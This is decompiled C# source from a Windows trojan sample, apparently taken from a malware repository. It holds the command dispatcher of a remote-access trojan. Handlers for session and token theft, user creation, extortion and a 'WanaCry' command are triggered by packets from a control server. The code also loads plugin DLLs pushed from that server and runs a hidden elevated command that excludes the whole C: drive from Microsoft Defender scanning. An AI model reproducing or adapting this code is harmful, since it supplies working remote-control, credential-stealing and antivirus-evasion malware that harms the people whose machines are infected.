// Decompiled with JetBrains decompiler
// Type: JYUfEoWFNtx.MvfZagPRHVeGhz
// Assembly: deinvater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89B491E0-9EDA-4D26-ADB9-208707ED33ED
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-561b48f813af5f638c5f305d21a716998cce9e0ce1ea3374fd118cec5f725885.exe

using aQUzeWhcKy;
using BKkyzJKHJApZN;
using BlTsOFsLZDoD;
using gVrzMmHGxE;
using Microsoft.CSharp.RuntimeBinder;
using ncvGHgHHoOnKRu;
using NtaKBmKHzYlK;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using VhygHQFaSVkdJD;
using wzcmoCobVvfl;
using xjXkkjtlfmw;
using zOUYjcXSyH;

namespace JYUfEoWFNtx
{
  public static class MvfZagPRHVeGhz
  {
    public static List<qndoAMceTifg> GpmmXciHSqt = new List<qndoAMceTifg>();

    public static void nBqiVRBhulQg(object uPLzztrQOkA)
    {
      try
      {
        VlSkfxdkdYhKt vlSkfxdkdYhKt = new VlSkfxdkdYhKt();
        qndoAMceTifg qndoAmceTifg1 = new qndoAMceTifg();
        qndoAmceTifg1.FitIpTcYCnNcl((byte[]) uPLzztrQOkA);
        string qwSoftuDqXer = qndoAmceTifg1.wepJRVVjtiqCpFB("Packet").qwSOFTUDqXer;
        // ISSUE: reference to a compiler-generated method
        switch (VekDUxbIGIG.QQwxOTBtvpe(qwSoftuDqXer))
        {
          case 124748138:
            if (!(qwSoftuDqXer == "CreateUser"))
              break;
            vlSkfxdkdYhKt.tgMTmiJdoLDzNm();
            break;
          case 330971514:
            if (!(qwSoftuDqXer == "plugin"))
              break;
            try
            {
              if (bJPRZcMFonVTZk.mNkEVxHqhPh(qndoAmceTifg1.wepJRVVjtiqCpFB("Dll").qwSOFTUDqXer) == null)
              {
                MvfZagPRHVeGhz.GpmmXciHSqt.Add(qndoAmceTifg1);
                qndoAMceTifg qndoAmceTifg2 = new qndoAMceTifg();
                qndoAmceTifg2.wepJRVVjtiqCpFB("Packet").MjkcAfdjfXGIS("sendPlugin");
                qndoAmceTifg2.wepJRVVjtiqCpFB("Hashes").MjkcAfdjfXGIS(qndoAmceTifg1.wepJRVVjtiqCpFB("Dll").qwSOFTUDqXer);
                yABknUITdI.MjCfIOzZokpvUuE(qndoAmceTifg2.YIFlWiIksqd());
                break;
              }
              MvfZagPRHVeGhz.mpqEeQFVZVF(qndoAmceTifg1);
              break;
            }
            catch (Exception ex)
            {
              MvfZagPRHVeGhz.oeIXOqnVSQX(ex.Message);
              break;
            }
          case 456311339:
            if (!(qwSoftuDqXer == "savePlugin"))
              break;
            bJPRZcMFonVTZk.AAzFcBaJOAzid(qndoAmceTifg1.wepJRVVjtiqCpFB("Hash").qwSOFTUDqXer, qndoAmceTifg1.wepJRVVjtiqCpFB("Dll").wsCIvgIRxeiZ());
            using (List<qndoAMceTifg>.Enumerator enumerator = MvfZagPRHVeGhz.GpmmXciHSqt.ToList<qndoAMceTifg>().GetEnumerator())
            {
              while (enumerator.MoveNext())
              {
                qndoAMceTifg current = enumerator.Current;
                if (current.wepJRVVjtiqCpFB("Dll").qwSOFTUDqXer == qndoAmceTifg1.wepJRVVjtiqCpFB("Hash").qwSOFTUDqXer)
                {
                  MvfZagPRHVeGhz.mpqEeQFVZVF(current);
                  MvfZagPRHVeGhz.GpmmXciHSqt.Remove(current);
                }
              }
              break;
            }
          case 748075170:
            if (!(qwSoftuDqXer == "Ballerlostroll"))
              break;
            xshJnbgmokddaR.YmCJcBuVzZm();
            break;
          case 754357560:
            if (!(qwSoftuDqXer == "WanaCry"))
              break;
            AgEAKJGjEDlB.jKPRgCdojLK();
            break;
          case 805092869:
            if (!(qwSoftuDqXer == "Test"))
              break;
            cLTNekrPGaO.MHVbCqfpQFlgw();
            break;
          case 1806784119:
            if (!(qwSoftuDqXer == "Erpressung"))
              break;
            new VlSkfxdkdYhKt().PnVQHZxnqQp();
            break;
          case 1961443878:
            if (!(qwSoftuDqXer == "BlockDomain"))
              break;
            PHXBTguBHRIzde phxbTguBhrIzde = new PHXBTguBHRIzde(qndoAmceTifg1);
            break;
          case 2061178551:
            if (!(qwSoftuDqXer == "pong"))
              break;
            yABknUITdI.DrnuTrOUNCntl = false;
            qndoAMceTifg qndoAmceTifg3 = new qndoAMceTifg();
            qndoAmceTifg3.wepJRVVjtiqCpFB("Packet").MjkcAfdjfXGIS("pong");
            qndoAmceTifg3.wepJRVVjtiqCpFB("Message").tdFzMCFXhNZC((long) yABknUITdI.gEfoADTVWjqO);
            yABknUITdI.MjCfIOzZokpvUuE(qndoAmceTifg3.YIFlWiIksqd());
            yABknUITdI.gEfoADTVWjqO = 0;
            break;
          case 2302946448:
            if (!(qwSoftuDqXer == "StealSessionMc"))
              break;
            try
            {
              DBzijTuEelii.CcKulHDFbAKiany();
              break;
            }
            catch
            {
              break;
            }
          case 2744018318:
            if (!(qwSoftuDqXer == "UnBlockHosts"))
              break;
            PHXBTguBHRIzde.CSKgCMbQlx();
            break;
          case 2787325062:
            if (!(qwSoftuDqXer == "TeamViewer"))
              break;
            ejDlKVZBsxoScq.yeEkatnmeZNrII();
            break;
          case 2866092763:
            if (!(qwSoftuDqXer == "wmicstealer"))
              break;
            DzelerGcTjqg.hSWizOTjcBFUu();
            break;
          case 3275378756:
            if (!(qwSoftuDqXer == "CrashMC"))
              break;
            vlSkfxdkdYhKt.hxWaFNQIZWO();
            break;
          case 3304865873:
            if (!(qwSoftuDqXer == "addExclusionC"))
              break;
            MvfZagPRHVeGhz.obaukzLIIsa("powershell Add-MpPreference -ExclusionPath C:\\");
            break;
          case 3420978424:
            if (!(qwSoftuDqXer == "TokenLog"))
              break;
            vlSkfxdkdYhKt.HLTaTBRtvlJoTjz();
            break;
        }
      }
      catch (Exception ex)
      {
        MvfZagPRHVeGhz.oeIXOqnVSQX(ex.Message);
      }
    }

    private static void mpqEeQFVZVF(qndoAMceTifg eLKBfEFKgZ)
    {
      object instance = Activator.CreateInstance(AppDomain.CurrentDomain.Load(BcMMvBLISbQz.XTXCYEhvgjbhqJIS(bJPRZcMFonVTZk.mNkEVxHqhPh(eLKBfEFKgZ.wepJRVVjtiqCpFB("Dll").qwSOFTUDqXer))).GetType("Plugin.Plugin"));
      // ISSUE: reference to a compiler-generated field
      if (MvfZagPRHVeGhz.bIPXVJvhAtiXs.UZlaOuwtBEMwI == null)
      {
        // ISSUE: reference to a compiler-generated field
        MvfZagPRHVeGhz.bIPXVJvhAtiXs.UZlaOuwtBEMwI = CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Run", (IEnumerable<Type>) null, typeof (MvfZagPRHVeGhz), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[9]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      MvfZagPRHVeGhz.bIPXVJvhAtiXs.UZlaOuwtBEMwI.Target((CallSite) MvfZagPRHVeGhz.bIPXVJvhAtiXs.UZlaOuwtBEMwI, instance, yABknUITdI.ZojEZyXrCulLtIU, FBcKnoLoUsnvl.hZZKnAetVvUUDO, FBcKnoLoUsnvl.RYMjzLvZvdxzD, eLKBfEFKgZ.wepJRVVjtiqCpFB("Msgpack").wsCIvgIRxeiZ(), rNgmWlMytwKsHa.NsmuJNzbDKdGZf, FBcKnoLoUsnvl.fVAOvwpxqHzEN, FBcKnoLoUsnvl.TXaoHLYxnuUD, FBcKnoLoUsnvl.XnDaAIuXamglr);
      MvfZagPRHVeGhz.EDDbGADoVuKL();
    }

    private static void EDDbGADoVuKL()
    {
      qndoAMceTifg qndoAmceTifg = new qndoAMceTifg();
      qndoAmceTifg.wepJRVVjtiqCpFB("Packet").qwSOFTUDqXer = "Received";
      yABknUITdI.MjCfIOzZokpvUuE(qndoAmceTifg.YIFlWiIksqd());
      Thread.Sleep(1000);
    }

    public static void oeIXOqnVSQX(string OkDGBAcjGi)
    {
      qndoAMceTifg qndoAmceTifg = new qndoAMceTifg();
      qndoAmceTifg.wepJRVVjtiqCpFB("Packet").qwSOFTUDqXer = "Error";
      qndoAmceTifg.wepJRVVjtiqCpFB("Error").qwSOFTUDqXer = OkDGBAcjGi;
      yABknUITdI.MjCfIOzZokpvUuE(qndoAmceTifg.YIFlWiIksqd());
    }

    private static void obaukzLIIsa(string GWcDFCumjQovwJ)
    {
      try
      {
        new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Hidden,
            FileName = "cmd.exe",
            Arguments = ("/C " + GWcDFCumjQovwJ),
            Verb = "runas"
          }
        }.Start();
      }
      catch
      {
      }
    }
  }
}
